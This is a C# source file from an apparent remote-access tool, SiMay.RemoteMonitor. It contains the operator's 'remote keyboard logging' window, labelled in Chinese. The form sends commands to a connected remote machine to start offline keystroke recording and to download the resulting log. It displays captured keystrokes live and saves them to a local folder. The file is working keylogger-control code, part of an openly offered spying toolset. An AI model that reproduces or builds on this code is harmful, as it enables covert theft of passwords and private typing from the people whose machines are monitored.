using SiMay.Basic;
using SiMay.Core;
using SiMay.Core.Extensions;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Net.SessionProvider.SessionBased;
using SiMay.RemoteMonitor.Attributes;
using SiMay.RemoteMonitor.ControlSource;
using SiMay.RemoteMonitor.Extensions;
using SiMay.RemoteMonitor.Notify;
using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using static SiMay.RemoteMonitor.Win32Api;

namespace SiMay.RemoteMonitor.Controls
{
    [ControlApp(40, "键盘记录", "RemoteKeyboradJob", "KeyboradManager")]
    public partial class KeyboardManager : Form, IControlSource
    {
        private const Int32 IDM_START_OFFLINE_RECORD = 1000;
        private const Int32 IDM_DOWNLOAD_OFFLINE = 1001;
        private const Int32 IDM_CLEAR = 1002;
        private const Int32 IDM_SAVE = 1003;

        private string _title = "//远程键盘记录 #Name#";
        private MessageAdapter _adapter;
        private PacketModelBinder<SessionHandler> _handlerBinder = new PacketModelBinder<SessionHandler>();
        public KeyboardManager(MessageAdapter adapter)
        {
            _adapter = adapter;
            adapter.OnSessionNotifyPro += Adapter_OnSessionNotifyPro;
            //adapter.ResetMsg = this.GetType().GetControlKey();
            _title = _title.Replace("#Name#", adapter.OriginName);
            InitializeComponent();
        }
        public void Action()
            => this.Show();
        private void Adapter_OnSessionNotifyPro(SessionHandler session, SessionNotifyType notify)
        {
            switch (notify)
            {
                case SessionNotifyType.Message:
                    _handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead(), this);
                    break;
                case SessionNotifyType.OnReceive:
                    break;
                case SessionNotifyType.ContinueTask:
                    this.Text = _title;
                    break;
                case SessionNotifyType.SessionClosed:
                    this.Text = _title + " [" + _adapter.TipText + "]";
                    break;
                case SessionNotifyType.WindowShow:
                    this.Show();
                    break;
                case SessionNotifyType.WindowClose:
                    _adapter.WindowClosed = true;
                    this.Close();
                    break;
                default:
                    break;
            }
        }

        private void KeyboardForm_Load(object sender, EventArgs e)
        {
            this.Text = _title;

            _adapter.SendAsyncMessage(MessageHead.S_KEYBOARD_ONOPEN);

            Init();
        }
        private void Init()
        {
            IntPtr sysMenuHandle = GetSystemMenu(this.Handle, false);

            InsertMenu(sysMenuHandle, 7, MF_SEPARATOR, 0, null);
            InsertMenu(sysMenuHandle, 8, MF_BYPOSITION, IDM_START_OFFLINE_RECORD, "开始离线记录");
            InsertMenu(sysMenuHandle, 9, MF_BYPOSITION, IDM_DOWNLOAD_OFFLINE, "下载离线记录");
            InsertMenu(sysMenuHandle, 10, MF_BYPOSITION, IDM_CLEAR, "清空记录");
            InsertMenu(sysMenuHandle, 11, MF_BYPOSITION, IDM_SAVE, "保存记录");
        }

        protected override void WndProc(ref Message m)
        {

            if (m.Msg == WM_SYSCOMMAND)
            {
                IntPtr sysMenuHandle = GetSystemMenu(m.HWnd, false);
                switch (m.WParam.ToInt64())
                {
                    case IDM_START_OFFLINE_RECORD:
                        _adapter.SendAsyncMessage(MessageHead.S_KEYBOARD_OFFLINE);

                        MessageBoxHelper.ShowBoxExclamation("离线记录已开始,最大保存50M离线记录!");
                        break;
                    case IDM_DOWNLOAD_OFFLINE:
                        _adapter.SendAsyncMessage(MessageHead.S_KEYBOARD_GET_OFFLINEFILE);

                        break;
                    case IDM_CLEAR:
                        txtKey.Text = "";
                        break;
                    case IDM_SAVE:
                        string savaPath = Application.StartupPath + "\\download";

                        if (!Directory.Exists(savaPath))
                            Directory.CreateDirectory(savaPath);

                        string fileName = savaPath + "\\" + DateTime.Now.ToFileTime() + " 键盘离线文件.txt";
                        StreamWriter fs = new StreamWriter(fileName, true);
                        fs.WriteLine(txtKey.Text);
                        fs.Close();
                        MessageBoxHelper.ShowBoxExclamation("离线记录文件已保存到:" + fileName);
                        break;
                }
            }
            base.WndProc(ref m);
        }
        public void OnReceive(SessionHandler session)
        {
        }

        [PacketHandler(MessageHead.C_KEYBOARD_DATA)]
        public void KeyBoardDataHandler(SessionHandler session)
        {
            txtKey.AppendText(DateTime.Now.ToString() + Environment.NewLine);
            txtKey.AppendText(session.CompletedBuffer.GetMessagePayload().ToUnicodeString() + Environment.NewLine);
        }

        [PacketHandler(MessageHead.C_KEYBOARD_OFFLINEFILE)]
        public void OffLinesDataHandler(SessionHandler session)
        {
            txtKey.Text = session.CompletedBuffer.GetMessagePayload().ToUnicodeString();
            MessageBoxHelper.ShowBoxExclamation("离线记录已停止!");
        }
        private void KeyboardForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            _handlerBinder.Dispose();
            _adapter.WindowClosed = true;
            _adapter.SendAsyncMessage(MessageHead.S_GLOBAL_ONCLOSE);
        }
    }
}